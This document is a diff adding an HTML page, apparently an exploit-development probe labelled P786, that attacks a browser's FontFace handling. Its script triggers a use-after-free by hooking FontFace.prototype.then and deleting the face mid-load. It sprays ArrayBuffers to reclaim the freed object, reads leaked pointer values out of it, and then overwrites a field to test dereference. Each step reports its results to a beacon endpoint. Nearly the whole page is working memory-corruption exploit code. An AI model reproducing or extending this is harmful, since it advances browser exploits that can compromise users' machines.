@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P786 — Focused FontFace UAF Loading Oracle & Deref Verification</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin-top: 0; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+</style>
+<script>
+'use strict';
+window.onerror = function(msg, url, line, col, err){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P786-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P786-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+var P58 = 0n, P68 = 0n;
+var BUF_B = null, VIEW_B = null;
+var FACE_B = null;
+var PENDING_FACE = null;
+
+function run(){
+  OUT = document.getElementById('out');
+  log('=== P786 FontFace UAF Loading Oracle & Deref Verification ===\n');
+  b('BOOT', 'start');
+
+  log('[Phase 1] Establishing proven single-pass UAF & address leak...');
+  phase1_UAF(function(){
+    log('\n[Phase 2] Baseline checks on Pending Loading Font...');
+    phase2_testPendingFont();
+
+    log('\n[Phase 3] Testing Re-Add & fonts.check() on Reclaimed Object...');
+    phase3_testReAddAndCheck();
+  });
+}
+
+/* =========================================================================
+   Phase 1: Reliable Single-Pass UAF (P708v2 mechanism with corrected indexing)
+   ========================================================================= */
+function phase1_UAF(cb){
+  b('P1-GO', 'start');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:cssFam;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  FACE_B = new FontFace('jsFam', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+
+      // 1. Remove style element
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+
+      // 2. Delete FACE_B from FontFaceSet
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      // 3. Spray 48 ArrayBuffers (192 bytes) to reclaim the freed CSSFontFace slot
+      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
+
+      // 4. Force FontSelector resolution
+      try { document.fonts.check('1em cssFam'); } catch(e){}
+      document.body.offsetHeight;
+
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  // Trigger: request both jsFam and cssFam
+  document.fonts.load('1em jsFam, cssFam', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if (best < 0 || bestNz < 4){
+      b('P1-MISS', 'bestNz=' + bestNz);
+      log('Phase 1 Miss: bestNz=' + bestNz);
+      return;
+    }
+
+    BUF_B = abs[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    // Correct indexing: offset 0x58 = index 11, offset 0x68 = index 13
+    P58 = VIEW_B[11];
+    P68 = VIEW_B[13];
+
+    var q0 = VIEW_B[0];
+    var q11 = VIEW_B[11];
+    var q12 = VIEW_B[12];
+    var q13 = VIEW_B[13];
+
+    b('P1-HIT', 'k=' + best + '|nz=' + bestNz + '|q0=0x' + h16(q0) +
+      '|p58=0x' + h16(P58) + '|q12=0x' + h16(q12) + '|p68=0x' + h16(P68));
+    log('Phase 1 HIT: k=' + best + ' nz=' + bestNz);
+    log('  q0(refcount)=0x' + h16(q0));
+    log('  q11(p58/ranges)=0x' + h16(P58));
+    log('  q12(capacity)=0x' + h16(q12));
+    log('  q13(p68/sources)=0x' + h16(P68));
+
+    setTimeout(cb, 50);
+  }, 250);
+}
+
+/* =========================================================================
+   Phase 2: Baseline Loading Font Behavior (Independent Verification)
+   ========================================================================= */
+function phase2_testPendingFont(){
+  b('P2-GO', 'start');
+
+  // Create an independent loading font face covering 'A' (U+0041)
+  PENDING_FACE = new FontFace('pndFam', 'url(/hang.php?nocache=' + Date.now() + '_pnd)', { unicodeRange: 'U+0041' });
+  document.fonts.add(PENDING_FACE);
+  PENDING_FACE.load().catch(function(){});
+
+  var status = PENDING_FACE.status;
+  var chkA = document.fonts.check('1em pndFam', 'A'); // in range
+  var chkB = document.fonts.check('1em pndFam', 'B'); // out of range
+  var chkSpace = document.fonts.check('1em pndFam', ' '); // space
+
+  b('P2-PND-ORACLE', 'status=' + status + '|chkA_inRange=' + chkA + '|chkB_outRange=' + chkB + '|chkSpace=' + chkSpace);
+  log('Phase 2 Pending Font: status=' + status);
+  log('  fonts.check(pndFam, "A") [in-range]: ' + chkA + ' (expected: false)');
+  log('  fonts.check(pndFam, "B") [out-of-range]: ' + chkB + ' (expected: true)');
+}
+
+/* =========================================================================
+   Phase 3: Testing Re-Add & fonts.check() on Reclaimed Object
+   ========================================================================= */
+function phase3_testReAddAndCheck(){
+  b('P3-GO', 'start');
+
+  if (!VIEW_B || !FACE_B){
+    b('P3-ABORT', 'missing-buf-or-face');
+    return;
+  }
+
+  // 1. Check BEFORE re-add
+  var preStatus = FACE_B.status;
+  var preHas = document.fonts.has(FACE_B);
+  var preChkJsA = document.fonts.check('1em jsFam', 'A');
+  var preChkJsB = document.fonts.check('1em jsFam', 'B');
+  var preChkCssA = document.fonts.check('1em cssFam', 'A');
+  var preChkCssB = document.fonts.check('1em cssFam', 'B');
+
+  b('P3-PRE', 'status=' + preStatus + '|has=' + preHas +
+    '|jsA=' + preChkJsA + '|jsB=' + preChkJsB + '|cssA=' + preChkCssA + '|cssB=' + preChkCssB);
+  log('Phase 3 Pre-Add: FACE_B.status=' + preStatus + ' has=' + preHas);
+  log('  check(jsFam): A=' + preChkJsA + ' B=' + preChkJsB);
+  log('  check(cssFam): A=' + preChkCssA + ' B=' + preChkCssB);
+
+  // 2. RE-ADD FACE_B to document.fonts
+  var addErr = 'none';
+  try {
+    document.fonts.add(FACE_B);
+  } catch(e){
+    addErr = e.name + ':' + e.message;
+  }
+  var postHas = document.fonts.has(FACE_B);
+  var postStatus = FACE_B.status;
+
+  // 3. Check AFTER re-add
+  var postChkJsA = document.fonts.check('1em jsFam', 'A');
+  var postChkJsB = document.fonts.check('1em jsFam', 'B');
+  var postChkCssA = document.fonts.check('1em cssFam', 'A');
+  var postChkCssB = document.fonts.check('1em cssFam', 'B');
+
+  b('P3-POST-ADD', 'addErr=' + addErr + '|has=' + postHas + '|status=' + postStatus +
+    '|jsA=' + postChkJsA + '|jsB=' + postChkJsB + '|cssA=' + postChkCssA + '|cssB=' + postChkCssB);
+  log('Phase 3 Post-Add: has=' + postHas + ' status=' + postStatus);
+  log('  check(jsFam): A=' + postChkJsA + ' B=' + postChkJsB);
+  log('  check(cssFam): A=' + postChkCssA + ' B=' + postChkCssB);
+
+  // 4. Test Dereference: Mutate q11 in VIEW_B
+  // Save original q11
+  var origQ11 = VIEW_B[11];
+  log('\n[Phase 4] Testing q11 Mutation & Dereference Detection...');
+
+  // Modify q11 to zero
+  VIEW_B[11] = 0n;
+  var zeroChkJsA = document.fonts.check('1em jsFam', 'A');
+  var zeroChkCssA = document.fonts.check('1em cssFam', 'A');
+
+  b('P3-DEREF-ZERO', 'origQ11=0x' + h16(origQ11) + '|jsA=' + zeroChkJsA + '|cssA=' + zeroChkCssA);
+  log('  q11=0x0: check(jsFam)="A"->' + zeroChkJsA + ' check(cssFam)="A"->' + zeroChkCssA);
+
+  // Restore q11
+  VIEW_B[11] = origQ11;
+  b('P3-RESTORE', 'restored=0x' + h16(VIEW_B[11]));
+  log('  q11 restored to 0x' + h16(origQ11));
+
+  b('DONE', 'all-tests-complete');
+  log('\n=== P786 COMPLETE ===');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  setTimeout(run, 0);
+} else {
+  document.addEventListener('DOMContentLoaded', run);
+}
+</script>
+</head>
+<body>
+  <h2>P786 — Focused FontFace UAF Loading Oracle & Deref Verification</h2>
+  <div id="status" class="status">Running probe...</div>
+  <pre id="out"></pre>
+</body>
+</html>
